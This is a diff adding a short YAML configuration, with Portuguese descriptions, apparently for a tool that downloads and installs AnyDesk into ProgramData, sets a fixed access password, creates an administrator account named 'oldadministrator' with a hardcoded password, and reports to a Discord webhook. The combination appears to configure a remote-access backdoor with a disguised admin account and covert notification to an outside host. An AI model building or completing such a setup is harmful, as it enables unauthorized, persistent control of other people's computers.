@@ -1,0 +1,18 @@
+anydeskURL:
+  value: "http://download.anydesk.com/AnyDesk.exe"
+  desc: "[i] URL para download do executável do AnyDesk"
+installPath:
+  value: "C:\\ProgramData\\AnyDesk"
+  desc: "[i] Diretório onde o AnyDesk será instalado"
+password:
+  value: "917bhasudbg7"
+  desc: "[i] Senha principal de acesso"
+adminUsername:
+  value: "oldadministrator"
+  desc: "[i] Nome do usuário administrador"
+adminPassword:
+  value: "lalaio1"
+  desc: "[i] Senha do usuário administrador"
+webhookURL:
+  value: "YOUR_DISCORD_WEBHOOK_URL"
+  desc: "[i] URL do webhook do Discord para notificações"
